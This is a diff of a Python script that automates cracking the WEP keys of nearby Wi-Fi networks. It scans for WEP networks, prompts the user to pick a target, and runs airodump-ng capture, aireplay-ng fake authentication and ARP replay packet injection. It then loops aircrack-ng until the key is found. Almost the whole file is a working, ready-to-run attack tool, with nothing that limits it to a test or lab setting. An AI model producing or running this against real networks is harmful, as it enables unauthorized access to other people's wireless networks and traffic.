@@ -4,111 +4,191 @@
 import os
 import subprocess
 import re
-import threading
-from datetime import datetime
+from threading import Thread
+import sys
+# from datetime import datetime
 import time
 
-def get_interface_mac(interface):
-    ifconfig_output = subprocess.check_output(["ifconfig", interface]).decode()
-    match = re.search(r'unspec\s+([A-Fa-f0-9\-]+)', ifconfig_output)
-    if match:
-        mac = match.group(1).replace('-', ':')
-        # Only take the first 17 characters (standard MAC format)
-        return mac[:17]
-    else:
-        return None
-
-def run_airodump(interface, target_mac, output_file, channel, stop_event):
-    """
-    Runs airodump-ng and monitors the #Data field.
-    Stops when #Data >= 100000 or stop_event is set.
-    """
-    print(f"[+] Starting airodump-ng on {interface}, targeting {target_mac}, channel {channel}, saving to {output_file}")
-    # Start airodump-ng as a subprocess
-    proc = subprocess.Popen([
-        "airodump-ng",
-        "--bssid", target_mac,
-        "-c", channel,
-        "-w", output_file,
-        interface
-    ], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1)
-
-    data_count = 0
-    cap_file = output_file + ".cap"
+# helper functions
+def find_wep_networks(interface):
+    """Scans for WEP networks and returns them as a list."""
+    print("[*] Scanning for WEP networks... Press Ctrl+C to stop scanning.")
+    wep_networks = []
     try:
-        while True:
-            # Check if .csv file exists and parse #Data from it
-            csv_file = output_file + ".csv"
-            if os.path.exists(csv_file):
-                with open(csv_file, "r") as f:
-                    for line in f:
-                        # Look for the line with the BSSID and #Data
-                        if target_mac.lower() in line.lower():
-                            fields = line.split(',')
-                            if len(fields) > 10:
-                                try:
-                                    data_count = int(fields[10].strip())
-                                    print(f"[i] #Data captured: {data_count}", end='\r')
-                                    if data_count >= 100000:
-                                        print(f"\n[+] #Data reached {data_count}, stopping airodump-ng.")
-                                        stop_event.set()
-                                        proc.terminate()
-                                        return cap_file
-                                except ValueError:
-                                    pass
-            if stop_event.is_set():
-                proc.terminate()
-                return cap_file
-            time.sleep(2)
+        # starts a process to scan the area for networks.
+        proc = subprocess.Popen(
+            ['sudo', 'airodump-ng', interface],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        time.sleep(10) # scan for 10 seconds
+    except KeyboardInterrupt:
+        pass
     finally:
         proc.terminate()
+        proc.wait()
+        output = proc.communicate()[0]
 
-def wep_wifi_hacking(interface, target_mac, gateway_mac):
-    print(f"[+] Starting WEP Wi-Fi hacking on {target_mac} via {gateway_mac} using {interface}")
-    mac = get_interface_mac(interface)
-    if mac:
-        print(f"[+] MAC address of {interface}: {mac}")
-    else:
-        print(f"[-] Could not find MAC address for {interface}")
-        return
+    # uses a pattern to find wep networks in the scan results.
+    network_regex = re.compile(r'(?P<bssid>([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})\s+.*?\s+(?P<channel>\d{1,2})\s+.*?\s+WEP\s+WEP\s+.*?\s+(?P<essid>.*)')
+    
+    for line in output.split('\n'):
+        match = network_regex.search(line)
+        if match:
+            network_info = match.groupdict()
+            # cleans up the network name.
+            network_info['essid'] = network_info['essid'].strip()
+            if network_info['essid'] and 'length' not in network_info['essid']:
+                wep_networks.append(network_info)
+    
+    return wep_networks
 
-    channel = input("Enter the Wi-Fi channel to monitor (e.g., 1, 6, 11): ").strip()
-    # Generate output file name with timestamp
-    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    output_file = f"wep_capture_{timestamp}"
+def select_target(networks):
+    """Displays a list of networks and prompts the user to select one."""
+    if not networks:
+        print("[!] No WEP networks found. Exiting.")
+        return None
 
-    # Ask user for ARP Request Replay Attack
-    arp_replay = input("[?] Do you want to perform ARP Request Replay Attack? (y/n): ").strip().lower()
-    stop_event = threading.Event()
+    print("\n[+] Found WEP Networks:")
+    for i, net in enumerate(networks):
+        print(f"  [{i}] BSSID: {net['bssid']} | Channel: {net['channel']:<2} | ESSID: {net['essid']}")
 
-    # Start airodump-ng in a separate thread
-    airodump_result = [None]
-    def airodump_thread_func():
-        airodump_result[0] = run_airodump(interface, target_mac, output_file, channel, stop_event)
-    airodump_thread = threading.Thread(target=airodump_thread_func)
-    airodump_thread.start()
+    # gets the user's choice.
+    while True:
+        try:
+            choice = int(input("\n[*] Select your target network number: "))
+            if 0 <= choice < len(networks):
+                return networks[choice]
+            else:
+                print("[!] Invalid selection.")
+        except ValueError:
+            print("[!] Please enter a number.")
 
-    if arp_replay == 'y':
-        # Associate with the target network
-        print(f"[+] Associating with {target_mac}...")
-        subprocess.call(["aireplay-ng", "--fakeauth", "0", "-a", target_mac, "-h", mac, interface])
-        print("[+] Performing ARP Request Replay Attack...")
-        # Start the ARP replay attack
-        subprocess.call(["aireplay-ng", "--arpreplay", "-b", target_mac, "-h", mac, interface])
+def set_monitor_mode(interface):
+    """Ensures the specified interface is in monitor mode."""
+    print(f"[*] Setting interface {interface} to monitor mode...")
+    try:
+        # runs a series of commands to prepare the wireless card.
+        subprocess.run(['sudo', 'ifconfig', interface, 'down'], check=True)
+        subprocess.run(['sudo', 'iwconfig', interface, 'mode', 'monitor'], check=True)
+        subprocess.run(['sudo', 'ifconfig', interface, 'up'], check=True)
+        print(f"[+] Interface {interface} is now in monitor mode.")
+        return True
+    except subprocess.CalledProcessError:
+        print(f"[!] Failed to set {interface} to monitor mode. Make sure the interface name is correct.")
+        return False
 
-    # Wait for airodump-ng to finish (when #Data >= 100000)
-    airodump_thread.join()
+# --- attack functions ---
+def run_airodump(interface, bssid, channel, filename):
+    """Starts airodump-ng to capture packets for a specific target."""
+    print("[*] Starting packet capture...")
+    command = ['sudo', 'airodump-ng', '--bssid', bssid, '-c', channel, '-w', filename, interface]
+    subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-    cap_file = airodump_result[0]
-    if cap_file and os.path.exists(cap_file):
-        print(f"[+] Captured enough data. Cracking WEP key using aircrack-ng on {cap_file} ...")
-        subprocess.call(["aircrack-ng", cap_file])
-    else:
-        print("[-] Capture file not found or insufficient data.")
+def run_fake_auth(interface, bssid):
+    """Performs fake authentication to associate with the target AP."""
+    print("[*] Performing fake authentication...")
+    command = ['sudo', 'aireplay-ng', '--fakeauth', '0', '-a', bssid, interface]
+    subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(5)
 
+def run_arp_replay(interface, bssid):
+    """Starts the ARP request replay attack to generate IVs."""
+    print("[*] Starting ARP request replay attack to generate traffic...")
+    command = ['sudo', 'aireplay-ng', '--arpreplay', '-b', bssid, interface]
+    subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+def run_aircrack(filename):
+    """Runs aircrack-ng in a loop to crack the key."""
+    print("\n[***] Starting cracking process. This will run until the key is found. [***]")
+    key_found = False
+    while not key_found:
+        try:
+            # checks the captured file for the key.
+            result = subprocess.run(
+                ['sudo', 'aircrack-ng', f'{filename}-01.cap'],
+                capture_output=True,
+                text=True,
+                check=True
+            )
+            if "KEY FOUND!" in result.stdout:
+                print("\n" + "="*40)
+                print("[!!!] WEP KEY FOUND! [!!!]")
+                print(result.stdout)
+                print("="*40)
+                key_found = True
+            else:
+                # provides a status update to the user.
+                print("[*] Not enough packets yet, still trying...", end='\r')
+                time.sleep(10)
+        except subprocess.CalledProcessError as e:
+            # aircrack-ng gives an error if the key isn't found, so we just continue.
+            time.sleep(10)
+        except KeyboardInterrupt:
+            print("\n[*] Exiting cracker.")
+            break
+
+# --- main function ---
+def main():
+    # checks if the user provided a wireless interface.
+    if len(sys.argv) < 2:
+        print(f"Usage: sudo python3 {sys.argv[0]} <wireless_interface>")
+        sys.exit(1)
+    
+    interface = sys.argv[1]
+    
+    if not set_monitor_mode(interface):
+        sys.exit(1)
+
+    networks = find_wep_networks(interface)
+    target = select_target(networks)
+    
+    if not target:
+        sys.exit(1)
+        
+    bssid = target['bssid']
+    channel = target['channel']
+    essid = target['essid']
+    filename = "wep_capture"
+
+    print(f"\n[+] Target locked: {essid} ({bssid}) on channel {channel}")
+    
+    # cleans up any old files from previous attempts.
+    for ext in ['.cap', '.csv', '.kismet.csv', '.kismet.netxml', '.log.csv']:
+        if os.path.exists(f"{filename}-01{ext}"):
+            os.remove(f"{filename}-01{ext}")
+    
+    # starts all the different attack tools at the same time.
+    dumper = Thread(target=run_airodump, args=(interface, bssid, channel, filename))
+    auth = Thread(target=run_fake_auth, args=(interface, bssid))
+    arp = Thread(target=run_arp_replay, args=(interface, bssid))
+    cracker = Thread(target=run_aircrack, args=(filename,))
+    
+    try:
+        dumper.start()
+        time.sleep(5) # gives the packet capture a head start.
+        auth.start()
+        time.sleep(5) # waits for the fake connection to be made.
+        arp.start()
+        cracker.start()
+        
+        # waits for the cracking process to finish.
+        cracker.join()
+
+    except KeyboardInterrupt:
+        print("\n[*] Shutting down all processes...")
+    finally:
+        # stops all the running attack tools.
+        subprocess.run(['sudo', 'killall', 'airodump-ng', 'aireplay-ng', 'aircrack-ng'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print("[+] All attack processes have been terminated.")
+        
+        # performs a final cleanup of capture files.
+        for ext in ['.cap', '.csv', 'kismet.csv', '.kismet.netxml', '.log.csv']:
+             if os.path.exists(f"{filename}-01{ext}"):
+                os.remove(f"{filename}-01{ext}")
+        print("[+] Capture files cleaned up.")
+
+# this line makes sure the main function runs when the script starts.
 if __name__ == "__main__":
-    interface = input("Enter the wireless interface name (e.g., wlan0): ").strip()
-    target_mac = input("Enter the target Wi-Fi MAC address: ").strip()
-    gateway_mac = input("Enter the gateway MAC address (leave blank if not known): ").strip() or None
-
-    wep_wifi_hacking(interface, target_mac, gateway_mac)
+    main()
